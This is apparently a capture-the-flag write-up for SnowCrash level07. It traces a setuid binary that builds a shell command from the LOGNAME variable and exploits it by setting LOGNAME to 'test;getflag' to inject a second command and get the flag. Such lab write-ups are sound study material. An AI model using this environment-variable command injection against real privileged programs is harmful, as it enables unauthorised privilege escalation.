# Snowcrash07

Again, we have a suid binary

```bash
~$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
~$ ltrace ./level07 
__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()= 2007
geteuid()= 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)= 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)= 0
getenv("LOGNAME")= "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff4f, 0xb7e5ee55, 0xb7fed280)= 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )= 0
+++ exited (status 0) +++

```

Ok so this uses env once again, we can poison that one more time
But it only reads from it once, not during the system call.
We can see however, that the return from this call is directly merged a /bin/echo lead then executed

So maybe we add stuff afterwards ?

```sh
~$ env LOGNAME='test;getflag' ./level07
test
Check flag.Here is your token : XXXXXXXXXXXXX
```
Getting the hang of this
Again, suid binary, getflag, no need for login
